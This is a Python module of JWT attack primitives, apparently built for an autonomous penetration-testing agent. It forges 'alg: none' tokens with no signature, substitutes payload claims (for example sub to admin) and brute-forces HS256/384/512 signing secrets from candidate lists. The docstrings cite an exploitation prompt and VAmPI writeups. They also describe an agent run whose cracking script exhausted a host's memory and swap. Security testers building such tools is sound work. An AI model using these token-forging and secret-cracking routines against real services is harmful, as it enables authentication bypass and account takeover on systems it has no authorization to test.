"""JWT decode/tamper helpers — pure, zero-I/O.

A reference exploitation prompt's own attack-pattern section (`exploit-auth.txt`,
read in full for this phase) states the alg-none technique verbatim: "Capture a
JWT. Decode the header and payload. Change header alg to none. Change payload
data (e.g., sub to admin). Re-encode (without signature part) and send in
request." These functions are the pure primitives for exactly that — what the
agent does with a tampered token (which request to fire it in, whether it
worked) is the agent's own judgment call via the ordinary ``http`` tool, not
baked in here. Kept deliberately optional/callable helpers, not a detector:
they never decide anything is vulnerable, they just produce a candidate token.

``jwt_crack_secret`` added after real evidence (four independent, hands-on
VAmPI exploitation writeups, and a live L4L0 run that reproduced the same
technique the hard way) showed a weak/guessable HS256 signing secret is
often the single most common, highest-value JWT weakness in practice - more
common than algorithm confusion, and one this module's own methodology had
no primitive for at all. The live run's own attempt at this (a hand-rolled
`run_command` Python script loading two entire wordlist directories fully
into memory with no aggregate cap) pushed its runtime container to its
Docker memory limit and exhausted the HOST's swap - a real incident, not a
hypothetical one. This function stays "pure, zero-I/O" like its siblings
(it takes an already-assembled iterable of candidate strings, never opens a
wordlist file itself) and enforces `_MAX_CRACK_CANDIDATES` as a hard,
structural nudge toward a small, curated candidate list (exactly what every
one of those four writeups actually used - a few dozen common defaults, not
an entire wordlist file) rather than the memory-unsafe pattern that caused
that incident.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from collections.abc import Iterable
from dataclasses import dataclass
from typing import Any

from ..core.errors import JwtMalformedError

_HMAC_ALGORITHMS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
# A curated candidate list this project's own methodology (see the jwt skill)
# now explicitly recommends over "load a whole wordlist file" - large enough
# for a genuinely thorough curated attempt, small enough that even the worst
# case (every candidate a long string) stays a rounding error of memory.
_MAX_CRACK_CANDIDATES = 5000


def _b64url_decode(segment: str) -> bytes:
    padding = "=" * (-len(segment) % 4)
    try:
        return base64.urlsafe_b64decode(segment + padding)
    except ValueError as exc:
        raise JwtMalformedError(f"invalid base64url segment: {exc}") from exc


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _load_json_object(blob: bytes, which: str) -> dict[str, Any]:
    try:
        data = json.loads(blob)
    except (json.JSONDecodeError, UnicodeDecodeError) as exc:
        raise JwtMalformedError(f"invalid JSON in {which}: {exc}") from exc
    if not isinstance(data, dict):
        raise JwtMalformedError(f"{which} is not a JSON object")
    return data


@dataclass(frozen=True)
class DecodedJwt:
    header: dict[str, Any]
    payload: dict[str, Any]
    signature: str


def jwt_decode(token: str) -> DecodedJwt:
    """Decode a JWT's header and payload without verifying the signature."""
    parts = token.split(".")
    if len(parts) != 3:
        raise JwtMalformedError(f"expected 3 dot-separated segments, got {len(parts)}")
    header_b, payload_b, signature = parts
    header = _load_json_object(_b64url_decode(header_b), "header")
    payload = _load_json_object(_b64url_decode(payload_b), "payload")
    return DecodedJwt(header=header, payload=payload, signature=signature)


def jwt_alg_none(token: str) -> str:
    """A tampered token with ``alg: none`` and no signature — the classic bypass attempt."""
    decoded = jwt_decode(token)
    header = {**decoded.header, "alg": "none"}
    header_b = _b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    payload_b = _b64url_encode(json.dumps(decoded.payload, separators=(",", ":")).encode("utf-8"))
    return f"{header_b}.{payload_b}."


def jwt_with_claim(token: str, claim: str, value: Any) -> str:
    """A token with one payload claim substituted; header and signature copied verbatim.

    The copied signature will not validate against the tampered payload
    unless combined with :func:`jwt_alg_none` or a cracked/leaked signing
    secret — that combination is the agent's own call, not this function's.
    """
    decoded = jwt_decode(token)
    payload = {**decoded.payload, claim: value}
    header_b = _b64url_encode(json.dumps(decoded.header, separators=(",", ":")).encode("utf-8"))
    payload_b = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    return f"{header_b}.{payload_b}.{decoded.signature}"


def jwt_crack_secret(
    token: str, candidates: Iterable[str], *, algorithm: str = "HS256"
) -> str | None:
    """Try each candidate secret against ``token``'s own signing input,
    stopping at the first match. Never materializes more than one candidate
    at a time — safe against however the caller's own iterable is produced
    (a small inline list, or a generator lazily reading a bounded number of
    lines from a file) — but ``candidates`` must still resolve to no more
    than `_MAX_CRACK_CANDIDATES` items in total; this is a structural nudge
    toward a small, curated list (see the module docstring for why), not
    just a performance cap. Returns the first matching secret, or ``None``
    if every candidate was tried and none matched.
    """
    hash_fn = _HMAC_ALGORITHMS.get(algorithm)
    if hash_fn is None:
        raise ValueError(
            f"unsupported algorithm {algorithm!r} (expected one of {sorted(_HMAC_ALGORITHMS)})"
        )
    decoded = jwt_decode(token)
    header_b, payload_b, _signature = token.split(".")
    signing_input = f"{header_b}.{payload_b}".encode("ascii")
    want = _b64url_decode(decoded.signature) if decoded.signature else b""
    count = 0
    for candidate in candidates:
        count += 1
        if count > _MAX_CRACK_CANDIDATES:
            raise ValueError(
                f"too many candidates (limit is {_MAX_CRACK_CANDIDATES}) - "
                "use a small, curated list rather than an entire wordlist file"
            )
        got = hmac.new(candidate.encode("utf-8"), signing_input, hash_fn).digest()
        if hmac.compare_digest(got, want):
            return candidate
    return None
